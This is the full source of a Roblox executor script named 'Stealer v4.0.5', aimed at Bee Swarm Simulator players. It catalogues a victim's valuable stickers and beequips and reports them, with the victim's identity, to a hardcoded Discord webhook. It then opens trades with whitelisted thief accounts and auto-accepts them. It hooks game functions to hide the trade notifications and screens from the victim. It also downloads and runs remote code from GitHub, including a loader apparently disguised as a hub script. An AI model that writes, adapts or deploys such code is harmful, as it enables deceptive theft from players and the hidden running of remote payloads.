---Infinitely waits for an object to exist inside the path and then returns it
local function await(object: Instance, ...: string): Instance
	local Result = object
	local Paths = {...}

	for i = 1, #Paths do
		Result = Result:WaitForChild(Paths[i], math.huge)
	end

	return Result
end

local PrivateServerWait = 300
local StealerVersion = "v4.0.5"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = await(LocalPlayer, "PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local MasterControl = require(await(LocalPlayer, "PlayerScripts", "ControlScript", "MasterControl"))
local CameraTools = require(await(ReplicatedStorage, "CameraTools"))
local AlertBoxes = require(await(ReplicatedStorage, "AlertBoxes"))
local Events = require(await(ReplicatedStorage, "Events"))
local TradeGui = require(await(ReplicatedStorage, "Gui", "TradeGui"))
local TradeSessionID
local HitMessage
local WebhookUsername = `Stealer {HttpService:GenerateGUID(false):split("-")[1]} {StealerVersion}`
local StatModifiers = require(await(ReplicatedStorage, "StatModifiers"))
local BeeStatMods = require(await(ReplicatedStorage, "BeeStats", "BeeStatMods"))
local CaseEntry = require(await(ReplicatedStorage, "Beequips", "BeequipCaseEntry"))
local BeequipFile = require(await(ReplicatedStorage, "Beequips", "BeequipFile"))
local GameData = {
	IsPrivateServer = not await(ReplicatedFirst, "PlaceInfo", "IsPublicServer").Value,
	IsBSS = await(ReplicatedFirst, "PlaceType").Value == "Main",
	CanTrade = await(LocalPlayer, "TradeConfig", "CanTrade").Value
}

---Make a HTTP request with error handling and retry if unexpected status code or failed to make request
local function HttpRequest(Url: string, Method: "GET" | "POST", StatusCodes: {number}, Body: table, __Fails: number): table
	assert(Method == "GET" or Method == "POST", "HttpRequest: GET or POST expected")
	local RequestFunction = (http and http.request) or (syn and syn.request) or http_request or request
	local Success, Response: table = pcall(function()
		return RequestFunction({
			Url = Url,
			Method = Method,
			Body = Body and HttpService:JSONEncode(Body),
			Headers = {
				["content-type"] = "application/json"
			}
		})
	end)
	if not Success or not Response or not table.find(StatusCodes, Response.StatusCode) then
		warn(`HttpRequest failed: {Response and Response.StatusCode or "No response"}\n{Response.Body}`)
		task.wait(1 * (__Fails or 1))
		return HttpRequest(Url, Method, StatusCodes, Body, (__Fails or 0) + 1)
	end
	return Response
end
print("Variables initialized")

repeat task.wait() until game:IsLoaded()
local LoadingGUI = await(PlayerGui, "LoadingScreenGui", "LoadingMessage")
repeat task.wait() until not LoadingGUI.Visible
local ScreenGui = await(PlayerGui, "ScreenGui")
local TradeLayer = await(ScreenGui, "TradeLayer")
print("Game loaded")

---Retrieve BSS Player cached stats
local function GetPlayerStats(): table
	return require(await(ReplicatedStorage, "ClientStatCache")):Get()
end

---Start the victim's process of giving away their items
local function InitStealer(UserWhitelist: {number}, Webhook: string, WhitelistedStickers: {string}, AtlasLoadstring: string): nil
	type Sticker = {}
	type Beequip = {}
	type BeequipTypeDef = {}
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/main/script.lua"))()

	---Returns a neatly formatted string showing the valuable stats of a beequip and to ping if it has high value, or returns nil if it isnt good at all
	local function GetBQStatsString(File: Beequip, Name: string): {string | boolean} | nil
		local Ping = false
		local Suc, Res = pcall(function()
			local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
			local Potential = File.Q * 5
			local NumWaxes = (File:GetWaxHistory() and #File:GetWaxHistory()) or 0
			local Strings = {
				Base = '',
				Hivebonus = '',
				Ability = ''
			}
			if BaseStats then
				local Lines = {}
				for i, v in ipairs(BaseStats) do
					local StatStr, Success = BeeStatMods.GetType(v.Stat).Desc(v)
					if Success then
						table.insert(Lines, StatStr)
					end
				end
				Strings.Base = table.concat(Lines, "\n")
			end
			if HiveBonuses then
				local Lines = {}
				for i, v in ipairs(HiveBonuses) do
					local StatStr = StatModifiers.Description(v)
					if StatStr then
						table.insert(Lines, StatStr)
					end
				end
				Strings.Hivebonus = table.concat(Lines, "\n")
			end
			if Abilities then
				local Lines = {}
				for i, v in ipairs(Abilities) do
					local Ability = v[1]
					if Ability then
						table.insert(Lines, Ability .. (v[2] and " (from wax)" or ''))
					end
				end
				Strings.Ability = table.concat(Lines, "\n")
			end

			local Stats = {}

			---Insert existing string into BQ stat table to be later formatted
			local function Concat(...: string | nil): nil
				for i, v in ipairs({...}) do
					if v ~= nil then
						table.insert(Stats, v)
					end
				end
				return nil
			end

			if Name == "Bead Lizard" then
				local TokenLink = Strings.Ability:match("Token Link")
				local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
				if BeeAbilityPollen == nil and TokenLink == nil then
					return
				end
				if TokenLink or (BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2) then
					Ping = true
				end
				Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

			elseif Name == "Camphor Lip Balm" then
				local BubblePollen = Strings.Hivebonus:match("%+(%d+)%% Bubble Pollen")
				local GoldBubblePollen = Strings.Hivebonus:match("%+(%d+)%% Gold Bubble Pollen")
				local PepperPollen = Strings.Hivebonus:match("x(%d+%.%d+) Pepper Patch Pollen")
				if tonumber(PepperPollen) < 1.07 and tonumber(BubblePollen) < 18 then
					if GoldBubblePollen then
						local GBP = tonumber(GoldBubblePollen)
						if GBP >= 6 then
							Ping = true
						elseif GBP == 5 then
							Ping = true
						elseif GBP == 4 then
							if tonumber(BubblePollen) < 14 then return end
							Ping = true
						elseif GBP == 3 then
							if tonumber(BubblePollen) < 15 then return end
							Ping = true
						elseif GBP == 2 then
							if tonumber(BubblePollen) < 16 then return end
							Ping = true
						else
							return
						end
					else
						return
					end
				end
				Concat(BubblePollen .. "% Bubble Pollen", GoldBubblePollen and GoldBubblePollen .. "% Gold Bubble Pollen", "x" .. PepperPollen .. " Pepper Patch Pollen")

			elseif Name == "Candy Ring" then
				local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
				if tonumber(HoneyAtHive) < 7 then
					return
				end
				Ping = true
				Concat(HoneyAtHive .. "% Honey At Hive")

			elseif Name == "Charm Bracelet" then
				local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
				local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
				local Melody = Strings.Ability:match("Melody")
				if Melody then
					Ping = true
				else
					return
				end
				Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")

			elseif Name == "Kazoo" then
				local CPHB = Strings.Hivebonus:match("%+(%d+)%% Critical Power")
				local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
				if CPHB == nil and SCPHB == nil then
					return
				end
				Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")

			elseif Name == "Paperclip" then
				local TokenLink = Strings.Ability:match("Token Link")
				local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
				local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
				if BeeAbilityPollen == nil and TokenLink == nil and (AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 5) then
					return
				end
				Ping = true
				Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

			elseif Name == "Pink Shades" then
				local Focus = Strings.Ability:match("Focus")
				local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
				local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Chance")
				Ping = true
				Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")

			elseif Name == "Smiley Sticker" then
				local HoneyMark = Strings.Ability:match("Honey Mark")
				local MarkDuration = Strings.Base:match("%+(%d+)%% Mark Duration")
				local MarkDurationHB = Strings.Hivebonus:match("%+(%d+)%% Mark Duration")
				if HoneyMark == nil then
					return
				end
				Ping = true
				Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))

			elseif Name == "Sweatband" then
				local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
				local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
				if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < 26) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < 27)) then
					return
				end

				local RGA = nil
				if RedGatherAmount then
					RGA = RedGatherAmount .. "% Red Gather Amount"
				end
				local WGA = nil
				if WhiteGatherAmount then
					WGA = WhiteGatherAmount .. "% White Gather Amount"
				end
				Ping = true
				Concat(RGA, WGA)

			elseif Name == "Whistle" then
				local Melody = Strings.Ability:match("Melody")
				local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
				if Melody == nil and SuperCritPower == nil then
					return
				end
				if Melody or (SuperCritPower and tostring(SuperCritPower) >= 3) then
					Ping = true
				end
				Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")

			elseif Name == "Elf Cap" then
				local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
				if HoneyAtHive == nil then
					return
				end
				if tonumber(HoneyAtHive) < 5 then
					if NumWaxes == 1 then
						if tonumber(HoneyAtHive) < 3 then
							return
						end
					elseif NumWaxes == 2 then
						if tonumber(HoneyAtHive) < 3 then
							return
						end
					elseif NumWaxes == 3 then
						if tonumber(HoneyAtHive) ~= 4 then
							return
						end
					else
						return
					end
				end
				Ping = true
				Concat(HoneyAtHive .. "% Honey At Hive")

			elseif Name == "Festive Wreath" then
				local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
				if HoneyAtHive == nil then
					return
				end
				if tonumber(HoneyAtHive) >= 2 then
					Ping = true
				end
				Concat(HoneyAtHive .. "% Honey At Hive")

			elseif Name == "Paper Angel" then
				local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
				local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
				if BeeAbilityPollen == nil or tonumber(BeeAbilityPollen) < 2 then
					if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
						return
					end
				end
				if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
					Ping = true
				end
				Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

			elseif Name == "Pinecone" then
				local PinetreeCapacity = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Capacity")
				local PinetreePollen = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Pollen")
				local PTC = tonumber(PinetreeCapacity)
				local PTP = tonumber(PinetreePollen)
				if PTC < 14 then return end
				if PTC == 14 or PTC == 15 then
					return
				elseif PTC == 16 then
					if PTP < 12 then return end
					Ping = true
				elseif PTC == 17 then
					if PTP < 9 then return end
					Ping = true
				elseif PTC >= 18 then
					Ping = true
				end
				Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")

			elseif Name == "Poinsettia" then
				local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
				local BeeGatherPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Gather Pollen")
				if RedPollen == nil and BeeGatherPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
					return
				end
				if (not BeeGatherPollen or tonumber(BeeGatherPollen) < 12) then
					local LimitRp = 7
					if BeeGatherPollen and tonumber(BeeGatherPollen) >= 10 then
						LimitRp = 5
					end
					if RedPollen and tonumber(RedPollen) >= LimitRp then
						Ping = true
					else
						return
					end
				end
				if RedPollen and tonumber(RedPollen) >= 7 then
					Ping = true
				end
				Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")

			elseif Name == "Reindeer Antlers" then
				local BondFromTreats = Strings.Hivebonus:match("%+(%d+)%% Bond From Treats")
				local Capacity = Strings.Hivebonus:match("%+(%d+)%% Capacity")
				local BabyLove = Strings.Ability:match("Baby Love")
				if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
					return
				end
				if BabyLove or (Capacity and tonumber(Capacity) >= 3) or BondFromTreats then
					Ping = true
				end
				Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")

			elseif Name == "Snow Tiara" then
				local BlueFieldCapacity = Strings.Hivebonus:match("^%+([%d%.]+)%% Blue Field Capacity")
				if tonumber(BlueFieldCapacity) < 6 then
					return
				end
				Concat(BlueFieldCapacity .. "% Blue Field Capacity")

			elseif Name == "Toy Drum" then
				local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
				if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
					return
				end
				if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
					Ping = true
				end
				Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

			elseif Name == "Toy Horn" then
				local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
				if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
					return
				end
				if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2 then
					Ping = true
				end
				Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
			else
				return
			end

			return #Stats > 0 and table.concat(Stats, "\n") or "No Stats"
		end)
		if not Suc then
			return "An error occured filtering stats: " .. tostring(Res)
		else
			return Res, Ping
		end
	end

	---Return beequip TypeDef file
	local function GetTypeDef(File: Beequip): BeequipTypeDef | nil
		local Success, Result = pcall(function()
			return CaseEntry.FromData(File):FetchBeequip(GetPlayerStats(), false)
		end)
		if Success then
			return Result
		end
		Success, Result = pcall(function()
			return BeequipFile.FromData(File)
		end)
		if Success then
			return Result
		end
		return nil
	end

	local function GetStickers(): {Sticker | nil}
		local PlayerStats = GetPlayerStats()
		local Stickers = PlayerStats.Stickers
		local Book = Stickers and Stickers.Book

		if not Book then
			warn("No sticker book!")
			return nil
		end

		local ReturnedStickers: {Sticker} = {}

		for _, File in ipairs(Book) do
			if File:GetTypeDef() and table.find(WhitelistedStickers, File:GetTypeDef().Name) then
				table.insert(ReturnedStickers, File)
			end
		end

		return ReturnedStickers
	end

	local function GetBeequips(): {Beequip | nil}
		local PlayerStats = GetPlayerStats()
		local Beequips = PlayerStats.Beequips
		local Case = Beequips and Beequips.Case or {}
		local Storage = Beequips and Beequips.Storage or {}

		local ReturnedBeequips: {Beequip} = {}

		for _, File in ipairs(Case) do
			local TypeDef = GetTypeDef(File)
			if TypeDef then
				local StatString = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
				if (#{StatString}) > 0 then
					table.insert(ReturnedBeequips, File)
				end
			end
		end

		for _, File in ipairs(Storage) do
			local TypeDef = GetTypeDef(File)
			if TypeDef then
				local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
				if (#{StatString}) > 0 then
					table.insert(ReturnedBeequips, File)
				end
			end
		end

		return ReturnedBeequips
	end

	---Collapse a list into another list of strings where duplicates are merged into a single string
	local function Collapse(list: table): table
		local Counts = {}
		local Order = {}

		for _, v in ipairs(list) do
			if Counts[v] then
				Counts[v] += 1
			else
				Counts[v] = 1
				table.insert(Order, v)
			end
		end

		local result = {}

		for _, v in ipairs(Order) do
			local n = Counts[v]
			if n > 1 then
				table.insert(result, `{n} {v}s`)
			else
				table.insert(result, v)
			end
		end

		return result
	end

	---Self explanatory name
	local function SortByHierarchy(List: table, Hierarchy: table): table
		local function GetRank(Item: string): number
			Item = string.lower(Item)

			for Index, Keyword in ipairs(Hierarchy) do
				if string.find(Item, string.lower(Keyword), 1, true) then
					return Index
				end
			end

			return math.huge
		end

		table.sort(List, function(A, B)
			local RankA = GetRank(A)
			local RankB = GetRank(B)

			if RankA == RankB then
				return A < B
			end

			return RankA < RankB
		end)

		return List
	end

	local function SendWebhook(): nil
		local Stickers = GetStickers()
		local Beequips = GetBeequips()

		---Fetch a URL image indicating an image of the player's roblox character
		local function GetHeadshotUrl(): string
			local Url = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={LocalPlayer.UserId}&size=420x420&format=Png&isCircular=false`
			local Response = HttpService:JSONDecode(HttpRequest(Url, "GET", {200}).Body)
			return Response.data[1].imageUrl
		end

		if #Stickers > 0 or #Beequips > 0 then
			local JoinLink = `https://www.roblox.com/games/start?placeId=102665229766189&launchData={game.PlaceId}/{game.JobId}`
			local Content = GameData.IsPrivateServer and ":warning: Private Server" or `@everyone [Press this to join server]({JoinLink})`
			local Description = #Stickers > 0 and `**Stickers ({#Stickers})**` or ""
			local StickerNames = {}
			local Hierachy = {
				"Cub Skin",
				"Voucher",
				"Hive Skin",
				"Star Sign",
				"Stamp",
				"Fleuron",
				"Painting"
			}

			for _, Sticker in ipairs(Stickers) do
				local Name = Sticker:GetTypeDef().Name:gsub("x2 ", '')
				table.insert(StickerNames, Name)
			end
			for _, Name in ipairs(Collapse(SortByHierarchy(StickerNames, Hierachy))) do
				Description ..= `\n{Name}`
			end

			Description ..= #Beequips > 0 and `{#Stickers > 0 and "\n\n" or ""}**Beequips ({#Beequips})**\n` or ""

			for _, Beequip in ipairs(Beequips) do
				local TypeDef = GetTypeDef(Beequip)
				local Goods = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
				if not (#{Goods} > 0) then
					continue
				end
				local Potential_Waxes = string.format("%s Potential | %d Waxes", string.format("%.1f", TypeDef.Q * 5), (TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0)
				Description ..= `\`{TypeDef:GetTypeDef().DisplayName}\`\n{Potential_Waxes}\n{Goods}\n\n`
			end

			if GameData.IsPrivateServer then
				Description = `Re-Execute ETA: <t:{os.time() + PrivateServerWait + 20}:R>\n\n ` .. Description
			end

			local Body = {
				content = Content,
				embeds = {{
					title = LocalPlayer.Name,
					color = 0x00c37b,
					description = Description:sub(1, 1023),
					thumbnail = {
						url = GetHeadshotUrl()
					},
					footer = {
						text = `User Id: {LocalPlayer.UserId}`
					}
				}},
				username = WebhookUsername
			}
			HitMessage = HttpService:JSONDecode(HttpRequest(Webhook .. "?wait=true", "POST", {200}, Body).Body)
		end
	end

	do
		SendWebhook()
	end;

	---The instance of the whitelisted player to act as the stealer
	local StealerPlayer: Player = nil

	---The BooleanValue that determines StealerPlayer is trading
	local StealerTrading: BoolValue = nil

	---The BooleanValue that determines the victim trading
	local VictimTrading: BoolValue = nil

	---Update neccessary values for stealing
	local function UpdateStealerInfo(Player: Player | nil): nil
		StealerPlayer = Player
		StealerTrading = Player and await(Player, "TradeConfig", "IsTrading") or nil
		VictimTrading = Player and await(LocalPlayer, "TradeConfig", "IsTrading") or nil
	end

	Players.PlayerAdded:Connect(function(Player)
		if table.find(UserWhitelist, Player.UserId) then
			UpdateStealerInfo(Player)
		end
	end)

	Players.PlayerRemoving:Connect(function(Player: Player)
		if table.find(UserWhitelist, Player.UserId) then
			UpdateStealerInfo(nil)
		end
	end)

	for _, Player: Players in ipairs(Players:GetPlayers()) do
		if table.find(UserWhitelist, Player.UserId) then
			UpdateStealerInfo(Player)
		end
	end

	---Hide all signs of trading or having traded
	local function HideTrades(): nil
		local Steps = {
			["Hide trade notifications"] = function()
				local OldPush
				OldPush = hookfunction(AlertBoxes.Push, newcclosure(function(self, Text, ...)
					if StealerPlayer and Text:find(StealerPlayer.Name) and Text:lower():find("trade") then return end
					return OldPush(self, Text, ...)
				end))
			end,
			["Hide trade cancelled/complete prompt"] = function()
				local Box = ScreenGui.MessagePromptBox
				Box:GetPropertyChangedSignal("Visible"):Connect(function()
					if Box.Box.TextBox.Text:lower():find("trade") then
						Box.Visible = false
					end
				end)
			end,
			["Allow moving in trade"] = function()
				local Old = clonefunction(CameraTools.DisablePlayerMovement)
				CameraTools.DisablePlayerMovement = function(...)
					if not StealerPlayer then
						return Old(...)
					end
					return
				end
			end,
			["Hide trade frame"] = function()
				TradeLayer.Visible = false
				TradeLayer:GetPropertyChangedSignal("Visible"):Connect(function()
					TradeLayer.Visible = false
				end)
			end,
			["Disable blur"] = function()
				local BlurShade = await(ScreenGui, "BlurShade")
				local Blur = await(Lighting, "Blur")
				BlurShade.Visible = false
				Blur.Enabled = false
				BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
					BlurShade.Visible = false
				end)
				Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
					Blur.Enabled = false
				end)
			end
		}

		for Name, Step in pairs(Steps) do
			--print("HideTrades Step: " .. Name)
			task.spawn(Step)
		end
	end

	do
		HideTrades()
	end;

	task.spawn(function()
		local LastTrade = 0
		while task.wait() do
			if #GetStickers() > 0 or #GetBeequips() > 0 then
				if StealerPlayer and VictimTrading ~= nil and StealerTrading ~= nil then
					if tick() - LastTrade >= 10 and not StealerTrading.Value and not VictimTrading.Value then
						LastTrade = tick()
						Events.ClientCall("TradePlayerRequestStart", StealerPlayer.UserId)
					end
				else
					LastTrade = 0
				end
			end
		end
	end)

	---Start the process of trading the items to the whitelisted player
	local function StartStealing(): nil
		---Add an item to the currently running trade
		local function AddItem(File: Sticker | Beequip, Type: string): nil
			if Type == "Sticker" then
				local Name = File:GetTypeDef().Name
				local RealCategory = "Sticker"
				if Name:sub(-7) == "Voucher" or Name:sub(-9) == "Hive Skin" or Name:sub(-8) == "Cub Skin" then
					RealCategory = "Sticker"
				end
				Events.ClientCall("TradePlayerAddItem", TradeSessionID, {
					["File"] = File,
					["Category"] = RealCategory
				})
			elseif Type == "Beequip" then
				Events.ClientCall("TradePlayerAddItem", TradeSessionID, {
					["File"] = File,
					["Category"] = Type
				})
			end
		end

		---Accept the currently running trade
		local function AcceptTrade(): nil
			while VictimTrading.Value and StealerTrading.Value do
				local _, Button: Instance | string = pcall(function()
					return TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel
				end)
				if typeof(Button) == "Instance" and Button.Text ~= "Unaccept" then
					Events.ClientCall("TradePlayerAccept", TradeSessionID, {
						[tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
						[tostring(StealerPlayer.UserId)] = TradeGui.GetTheirOffer()
					})
				end
				task.wait(1.5)
			end
		end

		local SpaceUsed = 0
		local MaxOfferSize = 30
		local StickersToSteal = GetStickers()
		local BeequipsToSteal = GetBeequips()

		for _, Sticker: Sticker in ipairs(StickersToSteal) do
			if SpaceUsed > MaxOfferSize then break end

			AddItem(Sticker, "Sticker")
			task.wait(0.2)

			SpaceUsed += 1
		end

		for _, Beequip: Beequip in ipairs(BeequipsToSteal) do
			if SpaceUsed > MaxOfferSize then break end

			AddItem(Beequip, "Beequip")
			task.wait(0.2)

			SpaceUsed += 1
		end

		AcceptTrade()
	end

	TradeLayer.ChildAdded:Connect(function(Frame: Frame)
		if StealerPlayer and Frame.Name == "TradeAnchorFrame" then
			repeat task.wait() until VictimTrading and StealerTrading and VictimTrading.Value and StealerTrading.Value
			warn("Started trading")
			StartStealing()
		end
	end)

	---Track completed trades between victim and stealer then send to the webhook, also listen for session id
	local function TrackTrades(GuildID): nil
		Events.ClientListen("TradeUpdateInfo", function(IncomingData)
			TradeSessionID = IncomingData.SessionID
			if IncomingData.State == "Completed" then
				local Body = {
					embeds = {{
						title = StealerPlayer.Name .. " completed a trade with  " .. LocalPlayer.Name,
						description = "Hit link: " .. string.format("https://discord.com/channels/%s/%s/%s", GuildID, HitMessage.channel_id, HitMessage.id),
						color = 50045,
						thumbnail = {
							url = "https://github.com/exodus892/__exodus__/raw/refs/heads/main/TRADEARROWS.webp"
						},
					}},
					username = WebhookUsername,
					footer = `User Id: {LocalPlayer.UserId}`
				}
				HttpRequest(Webhook, "POST", {200, 204}, Body)
			end
		end)
	end

	do
		TrackTrades("1489086193822859306")
	end;
	
	LocalPlayer.OnTeleport:Connect(function(State)
		queue_on_teleport(`loadstring(game:HttpGet'{AtlasLoadstring}')()`)
	end)

	if GameData.IsPrivateServer then
		task.delay(PrivateServerWait, function()
			while true do
				(function() -- Credit chatgpt, oh this whole stealer was made with chatgpt. ig son
					local servers = {}
					local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
					local body = game:GetService("HttpService"):JSONDecode(req)

					if body and body.data then
						for i, v in next, body.data do
							if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
								table.insert(servers, 1, v.id)
							end
						end
					end

					if #servers > 0 then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
					else
						return warn("Couldn't find a server.")
					end
				end)()
				task.wait(5)
			end
		end)
		return
	end

	return nil
end

return InitStealer(
	{2623169493, 1047362715},
	"https://discord.com/api/webhooks/1517661901641744434/zc46DEvrdeA0iiIuEMf-JtG_ZNRowiZ75KmHDsJHp4409eSJocON1mCcGzFFHnWbKGab",
	HttpService:JSONDecode(HttpRequest("https://raw.githubusercontent.com/Chris12980/ssshdhd/refs/heads/main/sssrhr.json", "GET", {200}).Body),
	"https://raw.githubusercontent.com/micahfish333-max/shark_hub/refs/heads/main/shark_hub.lua"
)
